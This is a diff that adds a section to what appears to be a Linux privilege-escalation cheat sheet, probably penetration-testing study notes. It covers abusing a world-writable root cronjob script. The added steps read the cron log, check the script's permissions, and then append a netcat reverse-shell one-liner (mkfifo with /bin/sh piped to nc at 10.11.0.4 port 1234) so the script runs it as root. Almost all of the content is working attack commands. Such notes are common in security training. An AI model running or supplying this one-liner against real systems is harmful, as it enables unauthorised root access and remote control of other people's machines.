@@ -70,3 +70,11 @@ lsblk
  ```
  find / -perm -u=s -type f 2>/dev/null
  ```
+ ##### Cronjob to elevate privilege
+ ```
+ 1. grep "CRON" /var/log/cron.log
+Jan27 18:00:01 victim CRON[2671]:(root) CMD (cd /var/scripts/ && ./user_backups.sh)
+2. ls -lah /var/scripts/user_backups.sh
+-rwxrwxrw- 1 root root 52 ian 27 17:02 /var/scripts/user_backups.sh
+3. echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f" >> user_backups.sh
+ ```
